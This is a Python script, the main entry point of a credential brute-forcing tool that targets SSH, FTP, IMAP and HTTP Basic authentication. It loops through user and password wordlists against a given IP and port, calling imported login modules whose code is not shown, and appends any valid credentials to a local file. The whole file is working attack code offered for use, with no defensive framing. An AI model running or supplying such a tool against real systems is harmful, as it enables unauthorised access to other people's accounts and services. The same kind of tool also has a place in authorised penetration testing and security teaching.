#!/bin/python3



import argparse
from ast import parse
from ssh_module import ssh_login
from http_basic_module import http_login
from ftp_module import ftp_login
from helper_functions import validate_args
from imap_module import imap_login

# Basic argument parser to allow for usage with the cli

# Initialize the parser

parser = argparse.ArgumentParser(description='Authentication Bruteforcing Tool for Network Services')

# Establish the accepted arguments

parser.add_argument('-m', dest='_execution_mode', type=str, help='Execution Mode [ftp | basic | ssh | imap]')
parser.add_argument('-t', dest='_target_ip', type=str, help='IP address of the target (i.e. 192.168.22.100)')
parser.add_argument('-p', dest='_target_port', type=str, help='Port of the network service (i.e. 22)')
parser.add_argument('-d', dest='_target_dir', type=str, help='Sub-directory path requiring BASIC authentication (i.e. /manager/html)')
parser.add_argument('-U', dest='_user_list', type=str, help='Path to username list (i.e. /root/users.txt)')
parser.add_argument('-P', dest='_pass_list', type=str, help='Path to password list (i.e. /root/passwords.txt)')

# Parse the arguments

args = parser.parse_args()

# Assign argument values to script variables

execution_mode = args._execution_mode
target_ip = args._target_ip
target_port = args._target_port
target_dir = args._target_dir
user_list = args._user_list
pass_list = args._pass_list

# Validate arguments

validate_args(execution_mode, target_ip, target_port, target_dir, user_list, pass_list)

# Status update

begin_status = target_ip + ":" + target_port
print("\n[+] Starting {} bruteforce attack on {}\n".format(str(execution_mode).upper(), begin_status))

# Success indicator

success = False

# Open user_list

with open(user_list, "r") as working_users:
	
	# Iterate through each line

	for user in working_users:

		# Format the user to prevent false negatives

		user = user.rstrip()

		# Nestedly open the pass_list

		with open(pass_list, "r") as working_passwords:

			# Iterate through the passlist

			for password in working_passwords:

				# Strip the password to prevent false negatives

				password = password.rstrip()

				# Conditional function call to check for successful authentication

				if execution_mode == 'ssh': 

					if ssh_login(target_ip, target_port, user, password) == True:

						success = True

				elif execution_mode == 'basic':

					if http_login(target_ip, target_port, target_dir, user, password) == True:

						success = True

				elif execution_mode == 'ftp':

					if ftp_login(target_ip, target_port, user, password) == True:

						success = True

				elif execution_mode == 'imap':

					if imap_login(target_ip, target_port, user, password) == True:

						success = True

				else:

					print("[-] Invalid execution mode!")

					exit()

				if success == True:

					# Status notification

					print("[SUCCESS] \nUsername: {} \nPassword: {}".format(user,password))

					# Write valid creds to local file

					open("valid_creds.txt", "a").write(f"\nHost: {target_ip}\nService: {execution_mode}\nPort: {target_port}\nUsername: {user}\nPassword: {password}\n")

					# Status notification

					print("\nCredentials saved to valid_creds.txt!")

					continue_execution = input("\nWould you like to continue the attack? [y/n] ")

					if continue_execution == 'y':

						success = False

						print()

					else:
						
						exit()

				else:

					# Status notification

					print("[FAILURE] \nUsername: {} \nPassword: {}\n".format(user,password))

					# Next Round